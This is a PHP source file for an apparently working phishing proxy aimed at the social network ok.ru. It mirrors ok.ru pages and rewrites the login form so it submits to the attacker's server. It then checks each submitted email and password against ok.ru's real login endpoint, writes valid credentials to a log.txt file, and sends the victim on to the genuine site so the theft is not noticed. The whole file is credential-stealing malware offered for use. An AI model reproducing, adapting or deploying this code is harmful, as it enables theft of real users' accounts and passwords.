<?php


class Parser
{
    public function getRequest($uri) {
        $curl = curl_init();
        curl_setopt_array($curl, array(
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_URL => 'https://ok.ru' . $uri,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
            CURLOPT_HTTPHEADER => getallheaders(),
            CURLOPT_SSL_VERIFYHOST => true,
            CURLOPT_SSL_VERIFYPEER => true,
        ));
        $response = curl_exec($curl);
        $response = str_replace('<link href="/res/css/prod/core/ncore.5ec79afb.css" type="text/css" rel="stylesheet" id="lightCoreCss">', '<base href="https://ok.ru/"><link href="/res/css/prod/core/ncore.5ec79afb.css" type="text/css" rel="stylesheet" id="lightCoreCss">', $response);
        $response = str_replace('action="https://www.ok.ru/https"', 'action="http://' . $_SERVER['HTTP_HOST'] . '/ok/login"', $response);
        curl_close($curl);
        echo $response;
    }

    public function postRequest($post) {
        $curl = curl_init();
        $param = [
            'fr.posted' => 'set',
            'fr.email' => $post['st_email'],
            'fr.password' => $post['st_password'],
            'fr.remember' => 'on'
        ];
        curl_setopt_array($curl, array(
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_URL => 'https://connect.ok.ru/dk?cmd=OAuth2Login&st.cmd=OAuth2Login',
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
            CURLOPT_SSL_VERIFYHOST => true,
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => http_build_query($param),
            CURLOPT_FOLLOWLOCATION => true,
        ));
        $response = curl_exec($curl);
        curl_close($curl);
        if(preg_match('/Неправильно указан логин/', $response)) {
            header('Location: /ok/dk?st.cmd=anonymMain&st.error=errors.password.wrong&st.email=' . $post['st_email']);
            die();
        } else {
            $fd = fopen($_SERVER['DOCUMENT_ROOT'] . "/ok/log.txt", 'a+');
            fwrite($fd, $post['st_email'] . ':' . $post['st_password'] . PHP_EOL);
            fclose($fd);
            header('Location: https://ok.ru');
            die();
        }
    }
}